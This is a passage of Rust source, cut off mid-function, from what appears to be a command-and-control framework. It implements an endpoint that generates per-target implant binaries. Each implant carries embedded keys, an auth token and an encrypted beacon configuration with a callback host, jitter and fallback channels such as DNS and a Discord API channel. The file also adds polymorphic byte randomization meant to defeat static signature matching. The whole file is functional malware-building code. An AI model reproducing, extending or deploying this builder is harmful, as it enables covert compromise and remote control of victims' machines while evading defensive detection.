//! Implant generation endpoint — server-side per-implant binary production.
//!
//! `POST /api/generate-implant` takes a JSON spec and returns a patched DLL (or
//! shellcode) with a per-implant X25519 keypair, one-time auth token, and
//! encrypted runtime config embedded in the `.nyx_cfg` PE section.
//!
//! ## Architecture
//!
//! 1. The CI pipeline produces a DLL template with an unpatched `.nyx_cfg`
//!    section (magic `0x41414141`, 1024 bytes of `0xAA`).
//! 2. The server loads this template at startup (`NYX_TEMPLATE`).
//! 3. On generation:
//!    - Generate a random 32-byte implant_priv (X25519 private key)
//!    - Derive implant_pub from implant_priv
//!    - Derive config_key via ECDH(implant_priv, server_pub) + HKDF
//!      (matching the implant's derive_config_key)
//!    - Encrypt config with config_key, store ciphertext+tag
//!    - Store implant_priv + server_pub + ciphertext in `.nyx_cfg`
//!    - Randomize the `.nyx_cfg` tail and append a random PE overlay
//!      (WP-G polymorphism, first increment — per-generation byte-level
//!      uniqueness on top of the per-implant keying)
//!    - Store implant metadata in DB
//!    - Return the patched binary
//!
//! ## Key storage
//!
//! The implant's X25519 private key and the server's public key are stored
//! directly in the `.nyx_cfg` section. The DLL binary itself is the protection
//! layer — stripped symbols and the encrypted section produce per-implant
//! fingerprints that resist casual static signature matching.

use std::sync::Arc;

use axum::{
    extract::State,
    http::{HeaderMap, StatusCode},
    Json,
};
use nyx_protocol::wire::Writer;
use rand::RngCore;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::{operators::OperatorIdentity, operators::Role, AppState, AuthOutcome};

/// Return type of [`generate_implant_keys`]: (implant_priv, implant_pub,
/// config_key, key_seed, auth_token, config_nonce) — all fixed-size arrays.
type ImplantKeyMaterial = ([u8; 32], [u8; 32], [u8; 32], [u8; 32], [u8; 32], [u8; 12]);

/// Return type of [`validate_generate_request`]:
/// (template, implant_store) references.
type ValidatedTemplate<'a> = (&'a Arc<Vec<u8>>, &'a Arc<nyx_store::ImplantStore>);

/// Apply X25519 scalar clamping to a 32-byte key.
/// - Clear the low 3 bits of byte 0
/// - Clear the high bit of byte 31
/// - Set the penultimate bit of byte 31
fn clamp_scalar(mut s: [u8; 32]) -> [u8; 32] {
    s[0] &= 0xF8;
    s[31] &= 0x7F;
    s[31] |= 0x40;
    s
}

/// Derive the per-implant config encryption key identically to the implant:
///
///   implant_pub = X25519(implant_priv)
///   shared = ECDH(implant_priv, server_pub)
///   config_key = HKDF-SHA256(shared, "nyx-implant-config-v1",
///                            server_pub || implant_pub)
///
/// This MUST match `derive_config_key` in
/// `crates/implant-tasks/src/config_placeholder.rs`.
fn derive_config_key_server(implant_priv: &[u8; 32], server_pub: &[u8; 32]) -> Option<[u8; 32]> {
    let implant_pub = nyx_protocol::crypto::public_from_secret(implant_priv)?;
    let shared = nyx_protocol::crypto::ecdh(implant_priv, server_pub)?;
    let mut info = [0u8; 64];
    info[..32].copy_from_slice(server_pub);
    info[32..].copy_from_slice(&implant_pub);
    let mut okm = [0u8; 32];
    // okm is exactly 32 bytes, well under the 8160-byte HKDF-Expand bound, so
    // OutputTooLong is unreachable here. The 32-byte fixed buffer keeps the
    // invariant compiler-checkable; if it ever fails (impossible for a correct
    // build) we surface it as a key-derivation failure rather than panicking.
    nyx_protocol::crypto::hkdf_sha256(&shared, b"nyx-implant-config-v1", &info, &mut okm).ok()?;
    Some(okm)
}

// ── PE validation ─────────────────────────────────────────────────────────

/// Validate a PE template at load time: MZ magic, PE signature at offset 0x3C,
/// minimum 4096 bytes. This is a startup-time sanity check — it guards against
/// corrupted/truncated files but does not parse the full NT header.
pub fn validate_template_pe(bytes: &[u8]) -> Result<(), String> {
    if bytes.len() < 4096 {
        return Err("template too small (min 4096 bytes)".to_string());
    }
    // MZ magic
    if bytes[0] != 0x4D || bytes[1] != 0x5A {
        return Err("missing MZ magic".to_string());
    }
    // PE signature pointer at offset 0x3C (little-endian u32)
    let pe_sig_off =
        u32::from_le_bytes([bytes[0x3C], bytes[0x3D], bytes[0x3E], bytes[0x3F]]) as usize;
    if pe_sig_off + 4 > bytes.len() {
        return Err("PE signature offset out of bounds".to_string());
    }
    if bytes[pe_sig_off] != 0x50
        || bytes[pe_sig_off + 1] != 0x45
        || bytes[pe_sig_off + 2] != 0x00
        || bytes[pe_sig_off + 3] != 0x00
    {
        return Err("missing PE\\0\\0 signature".to_string());
    }
    Ok(())
}

/// Validate a patched PE binary at generation time. Checks MZ, PE sig,
/// `.nyx_cfg` section magic (0xDEADBEEF), and section bounds so a malformed
/// implant is caught before it is stored or returned to the operator.
fn validate_patched_pe(binary: &[u8], cfg_offset: usize) -> Result<(), String> {
    check_patched_pe_headers(binary)?;
    check_nyx_cfg_layout(binary, cfg_offset)
}

/// Check the patched binary's minimum size, MZ magic, and PE\0\0 signature
/// at the offset pointed to by 0x3C.
fn check_patched_pe_headers(binary: &[u8]) -> Result<(), String> {
    if binary.len() < 4096 {
        return Err("patched binary too small".to_string());
    }
    if binary[0] != 0x4D || binary[1] != 0x5A {
        return Err("missing MZ magic in patched binary".to_string());
    }
    let pe_sig_off =
        u32::from_le_bytes([binary[0x3C], binary[0x3D], binary[0x3E], binary[0x3F]]) as usize;
    if pe_sig_off + 4 > binary.len() {
        return Err("PE signature offset out of bounds in patched binary".to_string());
    }
    if binary[pe_sig_off] != 0x50
        || binary[pe_sig_off + 1] != 0x45
        || binary[pe_sig_off + 2] != 0x00
        || binary[pe_sig_off + 3] != 0x00
    {
        return Err("missing PE\\0\\0 signature in patched binary".to_string());
    }
    Ok(())
}

/// Check the `.nyx_cfg` section magic, `data_len` bound, and section extents
/// in the patched binary.
fn check_nyx_cfg_layout(binary: &[u8], cfg_offset: usize) -> Result<(), String> {
    // .nyx_cfg section magic at cfg_offset
    if cfg_offset + 6 > binary.len() {
        return Err("cfg_offset out of bounds in patched binary".to_string());
    }
    let magic = u32::from_le_bytes([
        binary[cfg_offset],
        binary[cfg_offset + 1],
        binary[cfg_offset + 2],
        binary[cfg_offset + 3],
    ]);
    if magic != 0xDEADBEEF {
        return Err(format!(
            "bad .nyx_cfg magic at offset {cfg_offset}: expected 0xDEADBEEF, got 0x{magic:08X}"
        ));
    }
    // Validate data_len fits within the 1024-byte section. Layout:
    // [magic 4B][keying_levels 4B][data_len u16 2B] -> data_len at +8.
    // (Previously read at +4 — the keying_levels field — making this check a
    // permanent no-op; see server-aux-2.)
    let data_len = u16::from_le_bytes([binary[cfg_offset + 8], binary[cfg_offset + 9]]) as usize;
    if data_len > 900 {
        return Err(format!("data_len too large: {data_len} (max 900)"));
    }
    if cfg_offset + 1024 > binary.len() {
        return Err(".nyx_cfg section extends past EOF in patched binary".to_string());
    }
    // Config data must fit: ct+tag starts at cfg_offset+86 (4 magic + 4 keying
    // + 2 dlen + 12 nonce + 32 implant_priv + 32 server_pub = 86), end = cfg_offset+86+data_len.
    if cfg_offset + 86 + data_len > cfg_offset + 1024 {
        return Err("encrypted config data overflows .nyx_cfg section".to_string());
    }
    Ok(())
}

// ── Rate limiting ──────────────────────────────────────────────────────────

/// Maximum implant generation requests per sliding window.
const DEFAULT_RATE_LIMIT_MAX: usize = 10;
/// Per-operator global cap per window: bounds how many implants ONE identity
/// can emit across ALL targets (closes the rotate-target bypass — see
/// `check_rate_limit`).
const DEFAULT_OPERATOR_RATE_LIMIT_MAX: usize = 50;
/// Sliding window duration in seconds (1 hour).
const DEFAULT_RATE_LIMIT_WINDOW_SECS: u64 = 3600;

// ── Request / Response types ────────────────────────────────────────────────

/// Request body for `POST /api/generate-implant`.
#[derive(Debug, Deserialize)]
pub struct GenerateRequest {
    /// Callback host (IP or hostname). Required.
    pub callback: String,
    /// Callback port. Defaults to 8443.
    #[serde(default = "default_port")]
    pub port: u16,
    /// Output format: "dll" (default), "shellcode", "exe".
    #[serde(default = "default_format")]
    pub format: String,
    /// Beacon URI path (e.g., "/beacon"). Defaults to "/beacon".
    #[serde(default = "default_uri")]
    pub uri: String,
    /// Sleep interval in seconds between beacon cycles. Default 60.
    #[serde(default = "default_sleep")]
    pub sleep: u32,
    /// Jitter percentage (0-100). Default 20.
    #[serde(default = "default_jitter")]
    pub jitter: u8,
    /// Use TLS for beacon transport. Default true.
    #[serde(default = "default_tls")]
    pub tls: bool,
    /// Primary channel selector (implant `Channel` enum value 0-8). Default 0
    /// (Https). Paired on the wire with `fallback_bitmap` (spec-1 tail).
    #[serde(default)]
    pub primary_channel: u8,
    /// Automatic-failover chain bitmap: bit N = `Channel` enum value N;
    /// 0 = the implant's build-time default chain (backward compat). Bits 5-7
    /// (ExtC2) are ignored implant-side by design
    /// (`next_fallback_with_bitmap`); operator SetChannel is NOT gated.
    #[serde(default)]
    pub fallback_bitmap: u8,
    /// Features bitmap. See the architecture doc for bit definitions.
    #[serde(default)]
    pub features: u32,
    /// Number of HKDF environment keying layers (0 = off). Phase 3.
    #[serde(default)]
    pub keying: u32,
    /// ISO 8601 expiry timestamp, or empty = no expiry.
    #[serde(default)]
    pub expires: Option<String>,
    /// Operator notes.
    #[serde(default)]
    pub notes: Option<String>,
    /// Delivery mode: `"inline"` returns the patched binary as base64 in the
    /// JSON response body (`binary` field). Omit or set to any other value to
    /// skip inline delivery (metadata only).
    #[serde(default)]
    pub deliver: Option<String>,
}

fn default_port() -> u16 {
    8443
}
fn default_format() -> String {
    "dll".into()
}
fn default_uri() -> String {
    "/beacon".into()
}
fn default_sleep() -> u32 {
    60
}
fn default_jitter() -> u8 {
    20
}
fn default_tls() -> bool {
    true
}

/// Parse an implant expiry timestamp into Unix seconds.
///
/// Accepts three input forms (matching what an operator is likely to type in
/// the client UI, where the placeholder is `2026-12-31`):
///   - A bare integer: interpreted as Unix seconds (`"1735689600"`).
///   - `YYYY-MM-DD`: midnight UTC on that date.
///   - `YYYY-MM-DDTHH:MM:SSZ` (or with an explicit `+00:00` offset): the
///     full ISO 8601 instant. Offset is parsed but must be zero or `Z`;
///     non-UTC offsets are rejected to keep the contract unambiguous.
///
/// Returns `None` on any parse failure — the caller must surface this as a
/// 400 rather than silently defaulting to "never expire" (the v0.3.0 bug).
///
/// Validation is fail-closed:
///   - Years before 1970 are rejected: a kill date before the Unix epoch is
///     meaningless, and the civil-to-days conversion would go negative.
///   - The calendar check is exact: `civil_to_days` validates days-in-month
///     with leap-year logic (`2023-02-29` and `2025-04-31` are rejected).
///   - All arithmetic is checked: the conversions use `checked_mul`/
///     `checked_add`, so a value can never silently wrap a `u64`.
///
/// No `time`/`chrono` dependency — the parser is a hand-rolled ~40-line scan.
/// Civil-to-days-since-epoch uses the well-known Howard Hinnant algorithm
/// (valid for any year in [1970, 9999]).
fn parse_iso8601_to_unix(s: &str) -> Option<u64> {
    let s = s.trim();
    if s.is_empty() {
        return None;
    }
    // (1) Bare integer — Unix seconds.
    if let Ok(secs) = s.parse::<u64>() {
        return Some(secs);
    }
    // (2) YYYY-MM-DD or YYYY-MM-DDTHH:MM:SS[Z|+00:00]
    let (year, month, day) = parse_date_fields(s)?;
    // year >= 1970 ⇒ days >= 0; try_from is the checked conversion.
    let days = u64::try_from(civil_to_days(year, month, day)?).ok()?;
    // Default to midnight UTC if no time component.
    if s.len() == 10 {
        return days.checked_mul(86_400);
    }
    let (hour, minute, second) = parse_time_fields_and_suffix(s)?;
    let secs = days
        .checked_mul(86_400)?
        .checked_add(u64::from(hour).checked_mul(3_600)?)?
        .checked_add(u64::from(minute).checked_mul(60)?)?
        .checked_add(u64::from(second))?;
    Some(secs)
}

/// Parse and field-check the `YYYY-MM-DD` date part of `s`. Rejects anything
/// shorter than 10 bytes, non-digit fields, misplaced `-` separators, and
/// pre-epoch years.
fn parse_date_fields(s: &str) -> Option<(u32, u32, u32)> {
    let bytes = s.as_bytes();
    // Year: 4 ASCII digits.
    if bytes.len() < 10 || !bytes[..4].iter().all(u8::is_ascii_digit) {
        return None;
    }
    let year: u32 = s[..4].parse().ok()?;
    // Reject pre-epoch years: the Hinnant conversion yields negative day
    // counts for them, and a pre-1970 kill date is meaningless anyway.
    if year < 1970 {
        return None;
    }
    if bytes[4] != b'-' || bytes[7] != b'-' {
        return None;
    }
    if !bytes[5..7].iter().all(u8::is_ascii_digit) || !bytes[8..10].iter().all(u8::is_ascii_digit) {
        return None;
    }
    let month: u32 = s[5..7].parse().ok()?;
    let day: u32 = s[8..10].parse().ok()?;
    Some((year, month, day))
}

/// Parse and field-check the `HH:MM:SS` time part and the optional UTC
/// suffix of `s` (which is longer than 10 bytes, i.e. has a time component).
/// Non-UTC offsets are rejected to keep the contract unambiguous.
fn parse_time_fields_and_suffix(s: &str) -> Option<(u32, u32, u32)> {
    let bytes = s.as_bytes();
    // Expect 'T' or ' ' separator then HH:MM:SS.
    if bytes[10] != b'T' && bytes[10] != b't' && bytes[10] != b' ' {
        return None;
    }
    if bytes.len() < 19
        || !bytes[11..13].iter().all(u8::is_ascii_digit)
        || bytes[13] != b':'
        || !bytes[14..16].iter().all(u8::is_ascii_digit)
        || bytes[16] != b':'
        || !bytes[17..19].iter().all(u8::is_ascii_digit)
    {
        return None;
    }
    let hour: u32 = s[11..13].parse().ok()?;
    let minute: u32 = s[14..16].parse().ok()?;
    let second: u32 = s[17..19].parse().ok()?;
    if hour > 23 || minute > 59 || second > 60 {
        return None;
    }
    // Optional suffix: 'Z' (any case) or '+00:00' / '-00:00' (UTC only).
    let suffix = &s[19..];
    let suffix = suffix.trim();
    if !suffix.is_empty() {
        let lower_eq = |a: &str, b: &str| a.eq_ignore_ascii_case(b);
        if !(lower_eq(suffix, "Z") || suffix == "+00:00" || suffix == "-00:00") {
            return None; // non-UTC offset — reject
        }
    }
    Some((hour, minute, second))
}

/// True iff `y` is a Gregorian leap year (divisible by 4, except centuries
/// not divisible by 400).
fn is_leap_year(y: u32) -> bool {
    (y.is_multiple_of(4) && !y.is_multiple_of(100)) || y.is_multiple_of(400)
}

/// Days in Gregorian month `m` of year `y`, with February leap-day handling.
/// Returns 0 for an out-of-range month so the days-in-month check in
/// [`civil_to_days`] fails closed (callers reject `m` outside 1-12 anyway).
fn days_in_month(y: u32, m: u32) -> u32 {
    match m {
        1 | 3 | 5 | 7 | 8 | 10 | 12 => 31,
        4 | 6 | 9 | 11 => 30,
        2 if is_leap_year(y) => 29,
        2 => 28,
        _ => 0,
    }
}

/// Civil (gregorian) date → days since 1970-01-01. Howard Hinnant's algorithm.
/// Returns None for out-of-range month/day (caller surfaces as 400). The day
/// check is exact per month — including leap-year February — via
/// [`days_in_month`].
fn civil_to_days(y: u32, m: u32, d: u32) -> Option<i64> {
    // Domain guard: the epoch-relative arithmetic is only used for years in
    // [1970, 9999] (the caller rejects earlier years; the 4-digit year parse
    // caps at 9999). Keeping the check here too makes the function
    // self-contained: years before 1970 would produce negative day counts
    // that must never reach the caller's `u64` conversion.
    if !(1970..=9999).contains(&y) {
        return None;
    }
    if !(1..=12).contains(&m) || !(1..=days_in_month(y, m)).contains(&d) {
        return None;
    }
    let y = y as i64;
    let m = m as i64;
    let d = d as i64;
    let y0 = y - if m <= 2 { 1 } else { 0 };
    // y >= 1970 ⇒ y0 >= 1969 >= 0, so the classic algorithm's negative-era
    // branch (y0 < 0) is unreachable here; era is a plain floor division.
    let era = y0 / 400;
    let yoe = (y0 - era * 400) as u64; // [0, 399]
    let doy = (153 * (if m > 2 { m - 3 } else { m + 9 }) + 2) / 5 + d - 1; // [0, 365]
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy as u64; // [0, 146096]
    Some(era * 146_097 + doe as i64 - 719_468)
}

#[cfg(test)]
mod tests {
    use super::parse_iso8601_to_unix;

    #[test]
    fn parses_bare_unix_seconds() {
        // Backward compat: v0.3.0 only accepted this form.
        assert_eq!(parse_iso8601_to_unix("1735689600"), Some(1_735_689_600));
        assert_eq!(parse_iso8601_to_unix("0"), Some(0));
    }

    #[test]
    fn parses_iso_date_midnight_utc() {
        // 2025-01-01 00:00:00 UTC = 1735689600.
        assert_eq!(parse_iso8601_to_unix("2025-01-01"), Some(1_735_689_600));
        // Documented placeholder in the client UI is "2026-12-31".
        assert_eq!(parse_iso8601_to_unix("2026-12-31"), Some(1_798_675_200));
    }

    #[test]
    fn parses_iso_instant_with_z() {
        assert_eq!(
            parse_iso8601_to_unix("2025-01-01T00:00:00Z"),
            Some(1_735_689_600)
        );
        // Lowercase t/z accepted.
        assert_eq!(
            parse_iso8601_to_unix("2025-01-01t00:00:00z"),
            Some(1_735_689_600)
        );
        // Space separator accepted.
        assert_eq!(
            parse_iso8601_to_unix("2025-01-01 00:00:00Z"),
            Some(1_735_689_600)
        );
        // Explicit +00:00 offset (UTC).
        assert_eq!(
            parse_iso8601_to_unix("2025-01-01T00:00:00+00:00"),
            Some(1_735_689_600)
        );
    }

    #[test]
    fn rejects_non_utc_offsets_and_garbage() {
        // Non-UTC offset → reject (fail-closed, not silently shift).
        assert_eq!(parse_iso8601_to_unix("2025-01-01T00:00:00+05:00"), None);
        assert_eq!(parse_iso8601_to_unix("2025-01-01T00:00:00-08:00"), None);
        // Garbage.
        assert_eq!(parse_iso8601_to_unix("garbage"), None);
        assert_eq!(parse_iso8601_to_unix(""), None);
        assert_eq!(parse_iso8601_to_unix("   "), None);
        // Bad month/day.
        assert_eq!(parse_iso8601_to_unix("2025-13-01"), None);
        assert_eq!(parse_iso8601_to_unix("2025-01-32"), None);
        // Bad time.
        assert_eq!(parse_iso8601_to_unix("2025-01-01T25:00:00Z"), None);
        assert_eq!(parse_iso8601_to_unix("2025-01-01T00:60:00Z"), None);
    }

    #[test]
    fn validates_days_in_month_with_leap_year_logic() {
        // February: 2024 is a leap year → 29 valid; 2023 is not → 29 invalid.
        assert_eq!(parse_iso8601_to_unix("2024-02-29"), Some(1_709_164_800));
        assert_eq!(parse_iso8601_to_unix("2023-02-29"), None);
        // 30-day months reject day 31; 31-day months accept it.
        assert_eq!(parse_iso8601_to_unix("2025-04-30"), Some(1_745_971_200));
        assert_eq!(parse_iso8601_to_unix("2025-04-31"), None);
        assert_eq!(parse_iso8601_to_unix("2025-01-31"), Some(1_738_281_600));
        // Century rule: 2000 is a leap year, 2100 is not.
        assert_eq!(parse_iso8601_to_unix("2000-02-29"), Some(951_782_400));
        assert_eq!(parse_iso8601_to_unix("2100-02-29"), None);
        assert_eq!(parse_iso8601_to_unix("2400-02-29"), Some(13_574_563_200));
        // Day 0 is invalid.
        assert_eq!(parse_iso8601_to_unix("2025-01-00"), None);
    }

    #[test]
    fn rejects_pre_epoch_years() {
        assert_eq!(parse_iso8601_to_unix("1969-12-31"), None);
        assert_eq!(parse_iso8601_to_unix("1970-01-01"), Some(0));
        assert_eq!(parse_iso8601_to_unix("1970-01-01T00:00:00Z"), Some(0));
        // Bare unix seconds are epoch-relative and remain valid for values
        // below the epoch — they are seconds, not civil dates.
        assert_eq!(parse_iso8601_to_unix("0"), Some(0));
    }
}

// ── spec-1 channel tail: generation-time primary_channel/fallback_bitmap ────

#[cfg(test)]
mod channel_tail_tests {
    use super::{build_implant_config, check_request_fields, GenerateRequest, StatusCode};
    use nyx_protocol::wire::Reader;

    fn req() -> GenerateRequest {
        GenerateRequest {
            callback: "10.0.0.1".into(),
            port: 8443,
            format: "dll".into(),
            uri: "/beacon".into(),
            sleep: 60,
            jitter: 20,
            tls: true,
            primary_channel: 0,
            fallback_bitmap: 0,
            features: 0,
            keying: 0,
            expires: None,
            notes: None,
            deliver: None,
        }
    }

    /// Walk the head fields and return the reader positioned at the tail.
    fn head<'a>(blob: &'a [u8]) -> Reader<'a> {
        let mut r = Reader::new(blob);
        r.str().unwrap(); // callback
        r.u16().unwrap(); // port
        r.str().unwrap(); // uri
        r.u32().unwrap(); // sleep
        r.u8().unwrap(); // jitter
        r.u8().unwrap(); // tls
        assert_eq!(r.u8().unwrap(), 1); // has_token
        assert_eq!(r.blob().unwrap().len(), 32); // auth_token
        r.u32().unwrap(); // features
        r.u32().unwrap(); // keying
        r.u64().unwrap(); // expires_at
        r
    }

    #[test]
    fn tail_carries_channel_selectors() {
        let mut q = req();
        q.primary_channel = 2; // Dns
        q.fallback_bitmap = 0b110; // DohDns | Dns
        let (blob, _) = build_implant_config(&q, [7u8; 32]).unwrap();
        let mut r = head(&blob);
        assert_eq!(r.u8().unwrap(), 2, "primary_channel");
        assert_eq!(r.u8().unwrap(), 0b110, "fallback_bitmap");
        for i in 0..4 {
            assert_eq!(r.str().unwrap(), "", "channel param string {i}");
        }
        assert_eq!(
            r.remaining(),
            0,
            "tail must end the blob (spec-7/3 layers absent)"
        );
    }

    #[test]
    fn tail_defaults_keep_legacy_shape_semantics() {
        // bitmap = 0 with a present tail must mean "default chain", identical
        // to legacy configs that stop after expires_at.
        let (blob, _) = build_implant_config(&req(), [0u8; 32]).unwrap();
        let mut r = head(&blob);
        assert_eq!(r.u8().unwrap(), 0);
        assert_eq!(r.u8().unwrap(), 0);
    }

    #[test]
    fn primary_channel_past_enum_is_rejected() {
        let mut q = req();
        q.primary_channel = 9;
        let err = check_request_fields(&q).unwrap_err();
        assert_eq!(err.0, StatusCode::BAD_REQUEST);
        assert!(err.1.contains("primary_channel"));
    }
}

// ── WP-G polymorphism smoke tests (first increment: randomized .nyx_cfg tail
//    + random PE overlay) ────────────────────────────────────────────────────

#[cfg(test)]
mod polymorphism_tests {
    use super::*;

    /// Minimal synthetic DLL template: MZ magic, PE\0\0 signature (via the
    /// 0x3C pointer), and the 1024-byte `.nyx_cfg` placeholder at offset 1024
    /// (magic 0x41414141 + 0xAA fill), laid out exactly as
    /// `implant-tasks/src/config_placeholder.rs::NYX_CFG_PLACEHOLDER` builds it.
    const PLACEHOLDER_OFF: usize = 1024;

    fn synthetic_template() -> Vec<u8> {
        let mut t = vec![0u8; 8192];
        t[0] = 0x4D; // 'M'
        t[1] = 0x5A; // 'Z'
        t[0x3C] = 0x80; // PE signature at offset 0x80
        t[0x80] = 0x50; // 'P'
        t[0x81] = 0x45; // 'E'
        t[0x82] = 0x00;
        t[0x83] = 0x00;
        t[PLACEHOLDER_OFF] = 0x41;
        t[PLACEHOLDER_OFF + 1] = 0x41;
        t[PLACEHOLDER_OFF + 2] = 0x41;
        t[PLACEHOLDER_OFF + 3] = 0x41;
        for b in &mut t[PLACEHOLDER_OFF + 4..PLACEHOLDER_OFF + 1024] {
            *b = 0xAA;
        }
        t
    }

    fn test_request() -> GenerateRequest {
        GenerateRequest {
            callback: "192.0.2.1".into(),
            port: 8443,
            format: "dll".into(),
            uri: "/beacon".into(),
            sleep: 60,
            jitter: 20,
            tls: true,
            primary_channel: 0,
            fallback_bitmap: 0,
            features: 0,
            keying: 0,
            expires: None,
            notes: None,
            deliver: None,
        }
    }

    /// Patch the synthetic template end-to-end (keys are fixed dummies — the
    /// variation under test is the per-generation randomization, not keying).
    fn patched_binary() -> Vec<u8> {
        let mut binary = synthetic_template();
        let req = test_request();
        let ct = [0x42u8; 120]; // dummy ciphertext+tag, well under the 900 cap
        patch_implant_template(&mut binary, &req, [0x11; 32], [0x22; 32], [0x33; 12], &ct)
            .expect("patch must succeed on the synthetic template");
        binary
    }

    /// WP-G 验收 1（哈希差异）：同一模板、同一请求补丁两次，最终产物字节
    /// 必须不同（随机 .nyx_cfg 尾 + 随机 overlay）。
    #[test]
    fn two_generations_from_same_template_differ() {
        let mut a = patched_binary();
        let mut b = patched_binary();
        append_random_overlay(&mut a);
        append_random_overlay(&mut b);
        assert_ne!(a, b, "two generations must not be byte-identical");
    }

    /// WP-G 验收 2（功能等价）：随机化后产物仍通过全部补丁后校验，且功能
    /// 区域（段头 86 字节 + 密文）逐字节确定 —— 只有死区尾部被随机化。
    #[test]
    fn patched_binary_still_valid_and_functional_region_deterministic() {
        let a = patched_binary();
        let b = patched_binary();
        // Generation-time validation must accept both randomized binaries.
        validate_patched_pe(&a, PLACEHOLDER_OFF).expect("binary A must validate");
        validate_patched_pe(&b, PLACEHOLDER_OFF).expect("binary B must validate");
        // Header + ciphertext (bytes 0..86+120 of the section) are identical
        // across generations given identical inputs; the randomized tail
        // (bytes 206..1024) must differ and must not be all-zero.
        let data_end = 86 + 120;
        assert_eq!(
            a[PLACEHOLDER_OFF..PLACEHOLDER_OFF + data_end],
            b[PLACEHOLDER_OFF..PLACEHOLDER_OFF + data_end],
        );
        let tail_a = &a[PLACEHOLDER_OFF + data_end..PLACEHOLDER_OFF + 1024];
        let tail_b = &b[PLACEHOLDER_OFF + data_end..PLACEHOLDER_OFF + 1024];
        assert_ne!(tail_a, tail_b, "tail must be randomized per generation");
        assert!(
            tail_a.iter().any(|&x| x != 0),
            "tail must not be the old all-zero padding"
        );
    }

    /// Overlay：原内容逐字节保留、长度落在约定区间、两次追加不同。
    #[test]
    fn overlay_preserves_prefix_and_varies() {
        let base = patched_binary();
        let base_len = base.len();
        let mut a = base.clone();
        let mut b = base;
        append_random_overlay(&mut a);
        append_random_overlay(&mut b);
        assert!(a.len() >= base_len + 128 && a.len() < base_len + 128 + 4096);
        assert!(b.len() >= base_len + 128 && b.len() < base_len + 128 + 4096);
        // The patched image (including the .nyx_cfg patch) is untouched.
        assert_eq!(a[..base_len], b[..base_len]);
        // Two random overlays are (overwhelmingly) distinct.
        assert_ne!(a, b);
        // Header checks still pass on the overlaid binary (offset-based).
        check_patched_pe_headers(&a).expect("overlay must not disturb headers");
    }
}

#[derive(Debug, Serialize)]
pub struct GenerateResponse {
    pub ok: bool,
    /// Hex-encoded X25519 public key of the new implant.
    pub implant_pub: String,
    /// Hex-encoded SHA-256 of the output binary.
    pub sha256: String,
    /// Size of the output binary in bytes.
    pub size_bytes: usize,
    /// The output format.
    pub format: String,
    /// Human-readable message.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
    /// Base64-encoded patched binary (DLL/shellcode/exe). Present when the
    /// operator requests inline delivery via `"deliver": "inline"` in the
    /// request body; omitted otherwise (use the download endpoint).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub binary: Option<String>,
}

#[derive(Debug, Serialize)]
pub struct ImplantListResponse {
    pub ok: bool,
    pub implants: Vec<ImplantSummary>,
}

#[derive(Debug, Serialize)]
pub struct ImplantSummary {
    pub id: i64,
    pub implant_pub: String,
    pub auth_token_used: bool,
    pub created_at: String,
    pub callback_host: String,
    pub callback_port: u16,
    pub format: String,
    pub revoked: bool,
    pub expires_at: Option<String>,
}

// ── Handler ─────────────────────────────────────────────────────────────────

// ── generate_implant helpers ────────────────────────────────────────────────

/// Validate the generate-implant request: operator role, template/store
/// availability, and input sanity. Returns the template and implant-store
/// references on success.
fn validate_generate_request<'a>(
    op: &OperatorIdentity,
    template: Option<&'a Arc<Vec<u8>>>,
    implant_store: Option<&'a Arc<nyx_store::ImplantStore>>,
    req: &GenerateRequest,
) -> Result<ValidatedTemplate<'a>, (StatusCode, String)> {
    check_operator_role(op)?;

    let template = template.ok_or_else(|| {
        (
            StatusCode::SERVICE_UNAVAILABLE,
            "implant generation disabled: no DLL template loaded (set NYX_TEMPLATE)".into(),
        )
    })?;

    let implant_store = implant_store.ok_or_else(|| {
        (
            StatusCode::SERVICE_UNAVAILABLE,
            "implant generation disabled: no implant store".into(),
        )
    })?;

    check_request_fields(req)?;

    Ok((template, implant_store))
}

/// Reject operators with the Viewer role — read-only identities may not
/// generate implants.
fn check_operator_role(op: &OperatorIdentity) -> Result<(), (StatusCode, String)> {
    if op.role == Role::Viewer {
        return Err((
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot generate implants".into(),
        ));
    }
    Ok(())
}

/// Field-check the request body: callback length, jitter/format/sleep ranges,
/// and the generation-time env-keying prohibition.
fn check_request_fields(req: &GenerateRequest) -> Result<(), (StatusCode, String)> {
    // Validate inputs.
    if req.callback.is_empty() || req.callback.len() > 255 {
        return Err((
            StatusCode::BAD_REQUEST,
            "callback host must be 1-255 characters".into(),
        ));
    }
    if req.jitter > 100 {
        return Err((StatusCode::BAD_REQUEST, "jitter must be 0-100".into()));
    }
    if !matches!(req.format.as_str(), "dll" | "shellcode" | "exe") {
        return Err((
            StatusCode::BAD_REQUEST,
            "format must be 'dll', 'shellcode', or 'exe'".into(),
        ));
    }
    if req.sleep == 0 {
        return Err((
            StatusCode::BAD_REQUEST,
            "sleep must be > 0 (no-interval beacon is an IOC)".into(),
        ));
    }
    // env-keying (Phase 3) is a runtime-only lock: the implant mixes the
    // target machine's username/Machine-SID/MAC/GetTickCount64 into the
    // config key at decryption time. The server cannot mirror any of these
    // (the Temporal layer is a transient tick count the server can never
    // know at generation time), so a non-zero `keying` would produce an
    // implant that can never decrypt its own config — a dead beacon. Reject
    // hard rather than ship a guaranteed-broken implant. See
    // `crates/implant-tasks/src/env_keying.rs` for the layer semantics.
    if req.keying != 0 {
        return Err((
            StatusCode::BAD_REQUEST,
            "env-keying (keying != 0) is a runtime-only lock and cannot be \
             enabled at generation time: the server cannot mirror the target's \
             runtime username/SID/MAC/tick-count. Omit `keying` or set it to 0."
                .into(),
        ));
    }
    // Channel selector range: the implant `Channel` enum is 0..=8
    // (DiscordApi = 8). A value past the enum decodes fine but can never
    // resolve to a sender — fail closed at 400 rather than ship a
    // mis-channeled implant.
    if req.primary_channel > 8 {
        return Err((
            StatusCode::BAD_REQUEST,
            "primary_channel must be 0-8 (implant Channel enum)".into(),
        ));
    }
    Ok(())
}

/// Rate limiting: sliding window keyed by (operator, callback, port). Two
/// concerns are bounded by including the operator dimension:
///   1. Enumeration/spray against a single target: capped at
///      DEFAULT_RATE_LIMIT_MAX per target per window.
///   2. A single operator (or compromised token) flooding generation across
///      MANY targets: previously the (callback,port)-only key let an
///      attacker rotate the target to bypass the per-target cap and emit
///      unbounded implants. The operator-scoped key makes one identity's
///      volume observable + throttleable per target.
fn check_rate_limit(
    st: &AppState,
    op_name: &str,
    callback: &str,
    port: u16,
